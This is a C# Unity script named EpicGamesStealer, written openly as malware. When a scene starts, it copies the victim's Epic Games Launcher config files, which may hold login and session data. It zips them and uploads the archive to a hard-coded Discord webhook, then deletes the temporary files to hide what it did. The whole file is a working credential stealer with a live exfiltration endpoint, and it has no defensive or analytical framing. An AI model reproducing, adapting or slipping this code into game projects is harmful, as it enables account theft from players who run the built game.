using System;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;
using UnityEngine;

public class EpicGamesStealer : MonoBehaviour
{
    private string tempPath = Path.GetTempPath(); // Temporary path to store files
    private string discordWebhookUrl = "https://ptb.discord.com/api/webhooks/1279375945979007027/7hqN8Ux1SJD_6SuRtI7FMwEh41g4y_izHFwUvy3xULG87EP6Ek6JHmuYyQCjfLyGyT-8"; // Your Discord webhook URL

    private void Start()
    {
        StealEpicGamesConfig();
    }

    private async void StealEpicGamesConfig()
    {
        string epicPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher", "Saved", "Config", "Windows");
        string saveToPath = Path.Combine(tempPath, "EpicGames");

        try
        {
            // Step 1: Create directory
            Directory.CreateDirectory(saveToPath);

            // Step 2: Copy files
            CopyFiles(epicPath, saveToPath);

            // Step 3: Compress the copied files into a ZIP
            string zipFilePath = Path.Combine(tempPath, "Epïc Gämës.zip");
            ZipFile.CreateFromDirectory(saveToPath, zipFilePath);

            // Step 4: Send the ZIP file to Discord
            await SendFileToDiscord(zipFilePath);

            // Step 5: Clean up
            File.Delete(zipFilePath);
            Directory.Delete(saveToPath, true);
        }
        catch (Exception ex)
        {
            Debug.LogError($"Error in StealEpicGamesConfig: {ex.Message}");
        }
    }

    private void CopyFiles(string sourceDir, string destDir)
    {
        // Copy files from sourceDir to destDir
        if (Directory.Exists(sourceDir))
        {
            foreach (string file in Directory.GetFiles(sourceDir, "*.*", SearchOption.AllDirectories))
            {
                string destFile = Path.Combine(destDir, Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }
        }
        else
        {
            Debug.LogWarning("Epic Games directory does not exist.");
        }
    }

    private async Task SendFileToDiscord(string filePath)
    {
        using (var client = new HttpClient())
        {
            // Create a MultipartFormDataContent to hold the file content
            using (var content = new MultipartFormDataContent())
            {
                // Read the file into a FileStream
                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    content.Add(new StreamContent(fileStream), "file", Path.GetFileName(filePath));

                    // Send POST request to Discord webhook
                    var response = await client.PostAsync(discordWebhookUrl, content);
                    response.EnsureSuccessStatusCode(); // Throw if not a success code

                    Debug.Log("File sent successfully to Discord.");
                }
            }
        }
    }
}
